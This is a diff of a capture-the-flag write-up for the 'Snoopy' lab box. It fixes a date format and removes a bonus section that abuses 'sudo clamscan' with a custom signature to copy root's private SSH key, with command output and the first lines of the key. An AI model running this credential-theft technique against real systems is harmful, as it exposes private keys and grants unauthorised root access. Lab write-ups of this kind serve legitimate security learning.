@@ -444,7 +444,7 @@ cbrown@snoopy:/dev/shm/gittest$ git commit -m 'test'
 cbrown@snoopy:/dev/shm/gittest$ git log
 commit 6d81c284773a4d699ac388166473090e3375beb8 (HEAD -> main)
 Author: cbrown <cbrown@snoopy.htb>
-Date:   Tue May 9 15:33:35 2023 +0000
+Date:   Tue May 09 15:33:35 2023 +0000
 
     test
 
@@ -595,44 +595,5 @@ root
 root@snoopy:~# 
 ```
 
-### Bonus: Using the custom virus database to copy the private key
-The same method can be done to swipe the private ssh key. First, `xxd` an example private key to get the hex values:
-```bash
-┌──(kali㉿kali)-[~/Documents/Snoopy]
-└─$ xxd ~/.ssh/id_rsa
-00000000: 2d2d 2d2d 2d42 4547 494e 204f 5045 4e53  -----BEGIN OPENS
-00000010: 5348 2050 5249 5641 5445 204b 4559 2d2d  SH PRIVATE KEY--
-```
-Create a virus database that will flag all private keys:
-```bash
-sbrown@snoopy:/tmp$ cat 1.ndb
-Trojan.A:0:*:2d2d2d2d
-```
-Next, copy the private id_rsa to your current location:
-```bash
-sbrown@snoopy:/tmp$ sudo clamscan -d 1.ndb /root/.ssh/id_rsa --copy=./
-Loading:     0s, ETA:   0s [========================>]        1/1 sigs
-Compiling:   0s, ETA:   0s [========================>]       40/40 tasks
-
-/root/.ssh/id_rsa: Trojan.A.UNOFFICIAL FOUND
-/root/.ssh/id_rsa: copied to '/tmp/id_rsa'
-
------------ SCAN SUMMARY -----------
-Known viruses: 1
-Engine version: 1.0.0
-Scanned directories: 0
-Scanned files: 1
-Infected files: 1
-Data scanned: 0.00 MB
-Data read: 0.00 MB (ratio 0.00:1)
-Time: 0.014 sec (0 m 0 s)
-Start Date: 2023:05:09 22:43:31
-End Date:   2023:05:09 22:43:31
-sbrown@snoopy:/tmp$ cat id_rsa
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth/iMUF6W2ogsW0KPFN8MffExz2G9D/
-<...SNIP...>
-```
 ## Reflection
 I enjoyed the learning process for this box a considerable amount. Even from the beginning of enumerating DNS config files and setting up a mail server, this challenge gave me the opportunity to learn many new things! Although it was revealed to be mostly unintended, I appreciated how there were several possible paths to root. It was fun to discuss with others the ideas they had to manipulate the `clamscan` behaviors.
